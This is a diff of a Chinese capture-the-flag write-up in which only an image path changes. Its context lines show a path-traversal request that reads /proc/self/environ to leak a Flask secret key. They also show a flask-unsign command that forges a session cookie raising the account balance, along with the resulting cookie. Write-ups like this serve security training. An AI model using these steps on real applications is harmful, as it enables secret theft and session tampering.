@@ -32,7 +32,7 @@ flask-unsign解码一下，得到`{'balance': 1336, 'purchases': []}`，看来�
 
 访问/download?image=../../proc/self/environ得到SECRET\_KEY=eiYzH7ck0Pta8ghUGYRRpD8LtNjw5TE2ssJ1BL0F
 
-![](<../../.gitbook/assets/image (4) (1).png>)
+![](<../../.gitbook/assets/image (4) (1) (1).png>)
 
 重新加密session，`flask-unsign.exe --secret "eiYzH7ck0Pta8ghUGYRRpD8LtNjw5TE2ssJ1BL0F" --sign --cookie "{'balance': 2000, 'purchases': []}"`，得到`eyJiYWxhbmNlIjoyMDAwLCJwdXJjaGFzZXMiOltdfQ.YmkdOg.P80Or5syU9nQrh8nURtyyqinVUY`
 
